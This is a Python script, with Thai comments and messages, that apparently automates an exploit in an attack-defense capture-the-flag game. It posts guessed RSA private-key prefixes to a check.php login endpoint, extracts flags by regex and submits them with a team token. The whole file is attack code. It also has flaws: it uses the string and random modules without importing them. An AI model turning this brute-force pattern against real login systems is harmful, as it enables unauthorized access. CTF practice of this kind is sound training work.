import os
import json
import re
import sys
import requests

def generate_keys():
    if not os.path.exists('./keys.txt'):
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        
        genKeys = set()
        for i in range(100):
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048
            )
            private_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            private_pem = private_pem.decode()[:80]
            genKeys.add(private_pem)

        keys = list(genKeys)
        with open('./keys.txt', 'w') as f:
            json.dump(keys, f)
        return keys
    
    f = open('./keys.txt')
    keys = json.load(f)

    return keys

BASE_URL = "http://localhost:3000" 
CHECKSYSTEM_URL = "http://localhost:8081"

CHECKSYSTEM_HEADERS = {
    'X-Team-Token': os.getenv('TOKEN')
}
FLAG_REGEX = re.compile(r'TEAM\d{3}_\w{32}')

def generate_random_string(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

def main(team_id):
    keys = generate_keys()
    
    """ฟังก์ชันหลักของสคริปต์"""
    print(f"[*] เริ่มกระบวนการสำหรับ Team ID: {team_id}")

    # --- 1. ดึง Flag IDs จาก Checksystem ---
    flag_ids_url = f"{CHECKSYSTEM_URL}/flag_ids?service=10"
    try:
        print(f"[*] กำลังดึง Flag IDs จาก: {flag_ids_url}")
        response = requests.get(flag_ids_url, headers=CHECKSYSTEM_HEADERS, timeout=5)
        response.raise_for_status()
        
        all_flags_data = response.json()
        team_flag_ids = all_flags_data['flag_ids'][team_id]['flag_ids']
        print(f"[+] พบ {len(team_flag_ids)} Flag IDs สำหรับ Team {team_id}")
    except requests.exceptions.RequestException as e:
        print(f"[!] เกิดข้อผิดพลาดในการเชื่อมต่อกับ Checksystem: {e}")
        return
    except KeyError:
        print(f"[!] ไม่พบ Flag IDs สำหรับ Team ID '{team_id}' ในการตอบกลับจากเซิร์ฟเวอร์")
        return
    except json.JSONDecodeError:
        print("[!] ไม่สามารถแปลงการตอบกลับจาก Checksystem เป็น JSON ได้")
        return
    
    for flag_id in team_flag_ids:
        print(f"\n--- เริ่มต้น Exploit โดยใช้ Flag ID: {flag_id} ---")
        try:
            url = f"{BASE_URL}/check.php"
            for key in keys:
                payload = {
                    'private_key': key,
                    'login': str(flag_id)
                }
                r = requests.post(url, payload)
                found_flags = FLAG_REGEX.findall(r.text)
                if len(found_flags) == 0:
                    # print(f"[!] ไม่พบ Flag ในการตอบกลับสำหรับ Flag ID: {flag_id} ด้วย Private Key: {key}")
                    continue
                
                r = requests.put(f"{CHECKSYSTEM_URL}/flags", headers={
                        'X-Team-Token': os.getenv('TOKEN'),
                        'Content-Type': 'application/x-www-form-urlencoded',
                    }, json=found_flags, proxies={
                        'http': 'http://localhost:8080',
                    })
                
                if r.status_code == 200:
                    if r.json().get('status') == 'success':
                        print(f"[+] ส่ง Flag '{found_flags}' สำเร็จ")
                else:
                    print(f"[!] ไม่สามารถส่ง Flag '{found_flags}' ได้: {r.text}")

        except requests.exceptions.RequestException as e:
            print(f"[!] เกิดข้อผิดพลาดในรอบ Exploit นี้: {e}")
            continue # ไปยัง flag_id ถัดไป
        except Exception as e:
            print(f"[!] เกิดข้อผิดพลาดที่ไม่คาดคิด: {e}")
            continue


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("การใช้งาน: python exploit_script.py <teamID>")
        sys.exit(1)
        
    target_team_id = sys.argv[1] # 1
    main(target_team_id)

    

